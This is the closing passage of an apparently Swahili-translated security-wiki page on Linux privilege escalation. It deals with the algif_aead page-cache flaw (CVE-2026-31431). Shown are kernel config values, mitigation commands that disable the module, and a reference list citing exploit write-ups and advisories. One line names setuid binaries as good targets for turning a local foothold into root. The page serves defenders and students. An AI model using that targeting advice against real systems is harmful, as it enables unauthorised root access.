Thamani za usanidi zilizo hapa chini hutofautisha kiolesura kinachoweza kupakiwa na kile kilichojengwa ndani ya kernel; sheria za ujenzi wa crypto huunganisha `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` inaweza kupakiwa/kuondolewa kama module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: kiolesura kimejengwa ndani ya kernel
- binaries za setuid ni malengo mazuri kwa sababu patch inayohusu page cache pekee inaweza kutosha kugeuza foothold ya ndani kuwa root

#### Kupunguza attack surface kwa njia ya `algif_aead`

Ikiwa kiolesura kilicho hatarini kinatolewa na module inayoweza kupakiwa:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Ikiwa imejumuishwa kwenye kernel, baadhi ya ripoti za ufichuzi zilisema kuwa init path ilizuiwa kwa kutumia:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Aina hii ya mitigation inafaa kukumbukwa pia kwa LPE nyingine za kernel: ikiwa exploitation inategemea interface fulani ya hiari, kuizima au kuiweka kwenye blacklist kunaweza kuvunja njia ya exploit hata kabla ya kupatikana kwa kernel upgrade kamili.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – kuteka script inayoendeshwa na root ndani ya directory ya PaperCut inayoweza kuandikiwa na mtumiaji](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) Maswali Yanayoulizwa Mara kwa Mara](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Ufichuzi wa Openwall oss-security kuhusu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Marekebisho ya Linux stable: crypto: algif_aead - Rejesha utendaji wa out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — Ushauri kuhusu CVE-2026-31431](https://copy.fail/)
- [7] [Maelezo ya kiufundi ya Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repository ya DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Kuchambua na kutumia lahaja ya Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Marekebisho ya Linux: net: skb: hifadhi `SKBFL_SHARED_FRAG` katika `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigation ya awali ya Linux: weka `SKBFL_SHARED_FRAG` kwa pakiti za UDP zilizotumia splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — ukurasa wa mwongozo wa Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Nyaraka za Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Uhusiano wa programu za MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Vipimo vya Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Vipimo vya Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Lugha ya Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile ya Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Athari ya page cache ya AF_ALG ya Linux kernel](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Nyaraka za Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Nyaraka za Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Nyaraka za usanidi wa Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Nyaraka za systemd generator](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Uhandisi wa utambuzi wa Linux: mbinu za persistence](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
